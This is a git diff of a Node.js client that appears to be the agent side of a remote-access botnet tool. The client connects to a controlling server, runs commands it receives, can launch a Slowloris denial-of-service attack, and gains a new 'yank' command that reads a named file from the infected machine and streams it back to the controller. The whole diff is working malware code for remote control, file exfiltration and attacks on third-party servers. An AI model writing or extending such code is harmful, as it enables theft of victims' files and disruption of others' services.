@@ -2,6 +2,7 @@ import net from "net";
 import util from "util";
 import child_process from "child_process";
 import process from "process";
+import * as fs from "fs";
 import dotenv from "dotenv";
 import changeDir from "./shell.js";
 import slowLoris from "./attacks/slowloris.js";
@@ -35,15 +36,31 @@ function clearIntervalConnect() {
 	intervalConnect = false;
 }
 
+function sendFile(filePath) {
+	const fileStream = fs.createReadStream(filePath);
+
+	fileStream.on("data", (chunk) => {
+		client.write(chunk);
+	})
+
+	fileStream.on("error", (err) => {
+		console.log(err);
+	});
+
+	// fileStream.on("open", () => {
+	// 	fileStream.pipe(client);
+	// });
+}
+
 client.on("data", (data) => {
 	const dataStr = data.toString();
 
-		const commandArgs = {
-			"firstArg": dataStr.split(" ")[1],
-			"secondArg": dataStr.split(" ")[2],
-			"thirdArg": dataStr.split(" ")[3],
-			"fourthArg": dataStr.split(" ")[4]
-		}
+	const commandArgs = {
+		firstArg: dataStr.split(" ")[1],
+		secondArg: dataStr.split(" ")[2],
+		thirdArg: dataStr.split(" ")[3],
+		fourthArg: dataStr.split(" ")[4],
+	};
 
 	async function execute(command) {
 		await exec(
@@ -63,7 +80,6 @@ client.on("data", (data) => {
 	}
 
 	if (dataStr.startsWith("slowloris")) {
-		console.log("test")
 		slowLoris(
 			commandArgs.firstArg,
 			commandArgs.secondArg,
@@ -71,16 +87,20 @@ client.on("data", (data) => {
 			commandArgs.fourthArg
 		);
 	}
+
+	if (dataStr.startsWith("yank")) {
+		sendFile(path + "\\" + commandArgs.firstArg);
+	}
 });
 
 client.on("connect", () => {
 	clearIntervalConnect();
-	client.write("CLIENT connected");
 });
 
 client.on("error", (err) => {
 	launchIntervalConnect();
 });
+
 client.on("close", launchIntervalConnect);
 client.on("end", launchIntervalConnect);
 
